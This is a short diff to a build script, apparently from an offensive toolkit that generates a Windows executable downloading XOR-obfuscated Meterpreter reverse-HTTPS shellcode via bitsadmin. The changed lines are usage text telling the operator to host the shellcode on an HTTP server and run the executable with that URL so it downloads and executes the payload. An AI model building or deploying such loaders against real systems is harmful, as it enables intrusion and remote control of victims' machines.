@@ -59,15 +59,10 @@ strip output/downloadbitsadmin_mtrprtrxor_revhttps_win64.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf shellcode file needs to be hosted on a HTTP server
-Call the executable like:
-downloadbitsadmin_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
-Downloads the payload to disk, then reads the file and executes the payload."
 
-
-#USAGE_START
+echo "
 # The generated msf shellcode file needs to be hosted on a HTTP server
 # Call the executable like:
-# output.exe http://yourserver/thepayload.bin
+# $ downloadbitsadmin_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
 # Downloads the payload to disk, then reads the file and executes the payload.
-#USAGE_END
+"
